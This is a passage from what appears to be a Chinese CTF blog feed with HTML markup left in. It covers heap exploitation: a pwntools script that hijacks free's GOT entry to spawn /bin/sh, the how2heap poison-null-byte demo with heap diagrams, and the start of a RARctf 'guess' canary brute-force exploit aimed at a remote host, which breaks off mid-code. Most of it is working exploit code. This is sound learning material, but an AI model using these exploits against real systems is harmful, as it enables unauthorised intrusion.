class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">"00000000"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 0</span>    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">"11111111"</span><span class="token punctuation">)</span> <span class="token comment"># idx = 1</span>    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"/bin/sh\x00"</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">16</span><span class="token operator">+</span><span class="token string">"\x41"</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Content : "</span><span class="token punctuation">)</span>    free_addr <span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"free_addr :"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base :"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sys_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>    edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>ida反汇编看不太懂的时候gdb动态看看或许会更清楚</p><p>同时并不是所有题目会把索引地址放到bss段上，例如这题会把地址放在heap中。</p><h2 id="0x08-poison-null-byte"><a href="#0x08-poison-null-byte" class="headerlink" title="0x08 poison_null_byte"></a>0x08 poison_null_byte</h2><p>常见的null字节溢出，how2heap主要演示了利用null字节溢出伪造unlink得到堆重叠</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to poison null byte 2.0!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tested in Ubuntu 16.04 64bit.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> a<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> c<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b1<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> b2<span class="token punctuation">;</span><span class="token class-name">uint8_t</span><span class="token operator">*</span> d<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token operator">*</span>barrier<span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We allocate 0x100 bytes for 'a'.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"a: %p\n"</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> real_a_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Since we want to overflow 'a', we need to know the 'real' size of 'a' "</span><span class="token string">"(it may be more than 0x100 because of rounding): %#x\n"</span><span class="token punctuation">,</span> real_a_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00. * the least significant byte of this will be 0x10, because the size of the chunk includes * the amount requested plus some amount required for the metadata. */</span>b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b: %p\n"</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c: %p\n"</span><span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span>barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n"</span><span class="token string">"The barrier is not strictly necessary, but makes things less confusing\n"</span><span class="token punctuation">,</span> barrier<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span><span class="token operator">*</span> b_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><span class="token comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><span class="token comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><span class="token comment">//*(size_t*)(b+0x1f0) = 0x200;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"In newer versions of glibc we will need to have our updated size inside b itself to pass "</span><span class="token string">"the check 'chunksize(P) != prev_size (next_chunk(P))'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><span class="token comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token number">0x1f0</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x200</span><span class="token punctuation">;</span><span class="token comment">// this technique works by overwriting the size metadata of a free chunk</span><span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size is: (0x200 + 0x10) | prev_in_use\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We overflow 'a' with a single null byte into the metadata of 'b'\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>a<span class="token punctuation">[</span>real_a_size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// &lt;--- THIS IS THE "EXPLOITED BUG"</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b.size: %#lx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span>b_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">uint64_t</span><span class="token operator">*</span> c_prev_size_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"c.prev_size is %#lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>c_prev_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// This malloc will result in a call to unlink on the chunk where b was.</span><span class="token comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><span class="token comment">// will detect the heap corruption now.</span><span class="token comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><span class="token comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><span class="token comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><span class="token comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x10</span> <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b1: %p\n"</span><span class="token punctuation">,</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we malloc 'b1'. It will be placed where 'b' was. "</span><span class="token string">"At this point c.prev_size should have been updated, but it was not: %#lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>c_prev_size_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Interestingly, the updated value of c.prev_size has been written 0x10 bytes "</span><span class="token string">"before c.prev_size: %lx\n"</span><span class="token punctuation">,</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token operator">*</span><span class="token punctuation">)</span>c<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"We malloc 'b2', our 'victim' chunk.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span>b2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"b2: %p\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span><span class="token char">'B'</span><span class="token punctuation">,</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Current b2 content:\n%s\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we free 'b1' and 'c': this will consolidate the chunks 'b1' and 'c' (forgetting about 'b2').\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">free</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finally, we allocate 'd', overlapping 'b2'.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"d: %p\n"</span><span class="token punctuation">,</span>d<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now 'd' and 'b2' overlap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token char">'D'</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"New b2 content:\n%s\n"</span><span class="token punctuation">,</span>b2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks"</span><span class="token string">"for the clear explanation of this technique.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span>b2<span class="token punctuation">,</span> <span class="token string">"DDDDDDDDDDDD"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用过程如下：</p><p>首先申请一些堆块</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//real size = 0x111</span>b <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//real size = 0x211</span>c <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//real size = 0x111</span>barrier <span class="token operator">=</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//用来隔离top chunk</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">|--------------||         0x111| &lt;&#x3D;&#x3D; a|              ||              ||              ||--------------||         0x211| &lt;&#x3D;&#x3D; b |              ||              ||              ||              ||              ||              ||              ||--------------||         0x111| &lt;&#x3D;&#x3D; c|              ||              ||              ||--------------||         0x111| &lt;&#x3D;&#x3D;barrier|              ||              ||              ||--------------||     top chunk|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后在b的结尾布置伪造的prve_size = 0x200,释放b</p><pre class="line-numbers language-none"><code class="language-none">|--------------||         0x111| &lt;&#x3D;&#x3D; a|              ||              ||              ||--------------||         0x211| &lt;&#x3D;&#x3D; b (free)|fd     bk     ||              ||              ||              ||              ||              ||0x200         ||--------------||0x210    0x111| &lt;&#x3D;&#x3D; c|              ||              ||              ||--------------||         0x111| &lt;&#x3D;&#x3D;barrier|              ||              ||              ||--------------||     top chunk|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后offbynull溢出a修改b的size位</p><pre class="line-numbers language-none"><code class="language-none">|--------------||         0x111| &lt;&#x3D;&#x3D; a|..............||..............||..............||--------------||         0x200| &lt;&#x3D;&#x3D; b (free)|fd     bk     ||              ||              ||              ||              ||              ||0x200         ||--------------||0x210    0x111| &lt;&#x3D;&#x3D; c|              ||              ||              ||--------------||         0x111| &lt;&#x3D;&#x3D;barrier|              ||              ||              ||--------------||     top chunk|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后再申请两个chunk 0x100[b1]和0x80[b2] （小于0x200）</p><pre class="line-numbers language-none"><code class="language-none">|--------------||         0x111| &lt;&#x3D;&#x3D; a|..............||..............||..............||--------------||         0x111| &lt;&#x3D;&#x3D; b1|              ||--------------||          0x91| &lt;&#x3D;&#x3D; b2|              ||--------------||              | &lt;&#x3D;&#x3D; (null)|0x200         ||--------------||0x210    0x111| &lt;&#x3D;&#x3D; c|              ||              ||              ||--------------||         0x111| &lt;&#x3D;&#x3D;barrier|              ||              ||              ||--------------||     top chunk|<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后只要释放b1和c，即可触发b1和c的unlink（包含了b2）</p><p>最好再malloc(0x300)，即可再0x300的chunk中构造出一个可控的0x80的chunk[b2]</p><h3 id="Asis-CTF-2016-Books"><a href="#Asis-CTF-2016-Books" class="headerlink" title="Asis CTF 2016 Books"></a>Asis CTF 2016 Books</h3><p>又是超级经典题 ）</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> python2 </tag>
            
            <tag> ctf </tag>
            
            <tag> how2heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn-RARctf-guess</title>
      <link href="//post/pwn-RARctf-guess.html"/>
      <url>//post/pwn-RARctf-guess.html</url>
      
        <content type="html"><![CDATA[<h1 id="RARctf-guess"><a href="#RARctf-guess" class="headerlink" title="RARctf guess"></a>RARctf guess</h1><h1 id="0x00-分析"><a href="#0x00-分析" class="headerlink" title="0x00  分析"></a>0x00  分析</h1><p>一共可以爆破8个字节</p><p>前七次爆破canary（canary以00结尾）</p><p>第八次爆破ret</p><p>一次溢出 填充canary之后修改ret的最后3个字节位为one gadget</p><span id="more"></span><h1 id="0x01-exp"><a href="#0x01-exp" class="headerlink" title="0x01 exp"></a>0x01 exp</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> re <span class="token keyword">import</span> T<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>local <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> local<span class="token punctuation">:</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./guess'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">else</span><span class="token punctuation">:</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'193.57.159.27'</span><span class="token punctuation">,</span> <span class="token number">23476</span><span class="token punctuation">)</span><span class="token builtin">sum</span> <span class="token operator">=</span> <span class="token number">0</span>canary <span class="token operator">=</span> <span class="token number">0</span>idx <span class="token operator">=</span> <span class="token number">33</span><span class="token keyword">while</span> <span class="token builtin">sum</span> <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">:</span>low <span class="token operator">=</span> <span class="token number">0</span>high <span class="token operator">=</span> <span class="token number">0xff</span><span class="token keyword">if</span> <span class="token builtin">sum</span> <span class="token operator">!=</span> <span class="token number">7</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'(0-7)? '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>mid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'your guess: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">b'high'</span> <span class="token keyword">in</span> ret<span class="token punctuation">:</span>high <span class="token operator">=</span> mid<span class="token keyword">elif</span> <span class="token string">b'low'</span> <span class="token keyword">in</span> ret<span class="token punctuation">:</span>low <span class="token operator">=</span> mid<span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"["</span><span class="token punctuation">,</span> idx<span class="token punctuation">,</span> <span class="token string">"] ==> "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>get <span class="token operator">=</span> midtime <span class="token operator">=</span> idx <span class="token operator">-</span> <span class="token number">32</span><span class="token keyword">while</span> time<span class="token punctuation">:</span>mid <span class="token operator">=</span> mid<span class="token operator">*</span><span class="token number">0x100</span>time <span class="token operator">-=</span> <span class="token number">1</span>canary <span class="token operator">+=</span> mid<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[cancary] ==> "</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token punctuation">)</span>idx <span class="token operator">+=</span> <span class="token number">1</span><span class="token builtin">sum</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">break</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'(0-7)? '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span>mid <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>low<span class="token operator">+</span>high<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'your guess: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>ret <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token 